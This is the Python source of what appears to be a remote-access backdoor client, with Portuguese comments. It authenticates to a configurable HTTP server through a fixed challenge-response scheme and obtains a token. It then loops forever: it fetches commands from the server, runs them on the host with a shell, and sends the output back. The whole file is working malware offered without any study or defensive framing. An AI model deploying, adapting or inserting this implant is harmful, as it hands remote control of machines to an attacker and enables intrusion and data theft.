import http.client
import re
import time
import subprocess

host = "127.0.0.1:80"  # Mude isso
delay = 2
command_wait_timeout = 30

token = ""
ordem = ""
saida = ""


def verify_challenge(n: int) -> int:
    MULTIPLIER = 1234567
    ADDEND = 890123
    MODULUS = 2**32

    return (n * MULTIPLIER + ADDEND) % MODULUS


def reinicia():
    global token, ordem, saida

    print("Reset!")

    token = ""
    ordem = ""
    saida = ""


def comunica(data):
    global token

    try:
        conn = http.client.HTTPConnection(host)
        conn.request("POST", "/", data.encode(), headers={"token": token})
        response = conn.getresponse()
        body = response.read().decode()
        if response.status != 200 or body == "False":
            reinicia()
        return body
    except:
        reinicia()
        return ""


def autentica():
    global token

    print("Tentando autenticacao...")
    resposta = comunica("hi")
    if not re.match(r"[0-9]{10}$", resposta):
        print("Falha ao comunicar-se")
        return False

    print(f"Desafio recebido: {resposta}")

    resposta = verify_challenge(int(resposta))

    print(f"Enviando resposta: {resposta}")

    resposta = comunica(str(resposta))

    if not re.match(
        r"[a-f0-9]{8}-?[a-f0-9]{4}-?4[a-f0-9]{3}-?[89ab][a-f0-9]{3}-?[a-f0-9]{12}$",
        resposta,
    ):
        return False

    token = resposta
    print(f"Token recebido! {token}")


def apresenta():
    global ordem
    comando = comunica("")
    if comando:
        print(f"Ordem recebida: {comando}")
        ordem = comando


def responde():
    global saida
    print(f"Respondendo: {saida}")
    comunica(f"{saida}")
    saida = ""


def executa():
    global saida, ordem

    print(f"Executando comando: {ordem!r}")

    try:
        resultado = subprocess.run(
            ordem,
            shell=True,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            timeout=command_wait_timeout,
        )
        saida = resultado.stdout.strip()

    except subprocess.TimeoutExpired:
        saida = "Timeout"

    except subprocess.CalledProcessError as e:
        erro_stderr = e.stderr.strip() if e.stderr else ""
        saida = f"Erro (exit code {e.returncode}): {erro_stderr}"

    except Exception as e:
        saida = f"excececao inesperada: {e}"

    finally:
        ordem = ""

    print(f"saida: {saida!r}")


def main():
    while True:
        # Delay entre as requisicoes
        time.sleep(delay)

        # Estou autenticado?
        if not token:
            if not autentica():
                continue

        # Tenho dados a enviar?
        if saida:
            responde()

        # Tenho ordem?
        if ordem:
            executa()
        else:
            apresenta()


if __name__ == "__main__":
    main()
